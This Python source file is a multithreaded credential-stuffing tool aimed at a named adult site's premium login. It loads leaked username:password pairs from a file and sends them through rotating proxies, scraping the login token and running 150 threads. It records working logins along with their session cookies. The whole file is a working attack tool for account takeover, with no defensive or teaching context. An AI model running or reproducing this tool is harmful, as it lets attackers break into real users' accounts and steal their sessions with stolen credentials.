import requests
import sys, os
import random
import threading
import time
from helpers.colors import bcolors
from bs4 import BeautifulSoup as soup

from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)



class Brute(object):
    def __init__(self):
        self.projectName = "PornHub"
        self.projectFullName = "PornHub Bruteforce and Checker"
        self.description = "Some desc is here"
        self.good = 0
        self.bad = 0 
        self.error = 0
        self.captcha = 0
        self.running = True
        self.timeout = 15
        self.thread_count = 150
        self.lines = []
        self.lock = threading.Lock()
        self.count_list = 0

    def check(self, login, password):
        try:
            proxies = {
                'https': self.getproxy()
                #BURP
                #'https': '127.0.0.1:8080'
            }
            r = requests.get("https://rt.pornhubpremium.com/premium/login", proxies=proxies, verify=False, timeout=self.timeout)
            site = soup(r.text, "html.parser")
            token = site.find("input", id="token")
            body = {'username' : login, 'password': password, 'remember_me' : 'on', 'token' : str(token['value']), 'redirect' : '', 'from' : 'pc_premium_login', 'segment':'straight'}
            r = requests.post("https://rt.pornhubpremium.com/front/authenticate", data=body, proxies=proxies, verify=False, timeout=self.timeout)
            
            if r.json()['success'] == "0":
                self.bad += 1
            elif r.json()['success'] == "1":
                self.writelog("good.txt", login + ":" + password + "|" + str(r.json()['premium_redirect_cookie']))
                self.good += 1
                #return login + ":" + password + "|" + str(r.json()['result']['basic']) + "|" + str(r.json()['result']['bonus'])
            else :
                self.error += 1
        except Exception as e:
            #print("Error is " + str(e))
            self.error += 1
    
    def stop(self):
        self.running = False
        print("Work ended")

   



    def mult(self):
        with open("log.txt", "r") as tags:
            for line in tags:
                #print(bcolors.WARNING + '[+] Start scanning : ' + line.strip() + bcolors.ENDC)
                self.lines.append(line.strip())
            print('Count of accounts : ' + str(len(self.lines)))  
            self.count_list = len(self.lines) 
        self.startth()

    def startth(self):
        for i in range(self.thread_count):
            t = threading.Thread(target=self.work)
            t.start()

    def work(self):
    #print(bcolors.WARNING + '[+] Start scanning : ' + str(self.lines[0]) + bcolors.ENDC)
        while self.running:
            if (len(self.lines) == 0):
                self.running = False
                self.stop()
                break

            self.lock.acquire()
            print( str(len(self.lines)) + "/" + str(self.count_list) + " " +bcolors.OKGREEN + str(self.good) + bcolors.ENDC   + "/" + bcolors.FAIL + str(self.bad) + bcolors.ENDC + "/"  + bcolors.WARNING+ str(self.error) + bcolors.ENDC, end='\r')
            sys.stdout.flush()
            trl = self.lines[0]
            self.lines.pop(0)
            self.lock.release()

            if ":" in trl:
                self.check(trl.split(':')[0], trl.split(':')[1])
            if ";" in trl:
                self.check(trl.split(';')[0], trl.split(';')[1])
            
            time.sleep(1)
        self.exit_thread()

    def exit_thread(self):
        self.lock.acquire()
        self.thread_count -= 1
        self.lock.release()

    def getproxy(self):
        lines = open('proxy.txt').read().splitlines()
        myline =random.choice(lines)
        return myline

    def writelog(self, file, log):
        dirr = self.projectName +"/"+file
        os.makedirs(os.path.dirname(dirr), exist_ok=True)
        with open(dirr, 'w') as the_file:
            the_file.write(log)
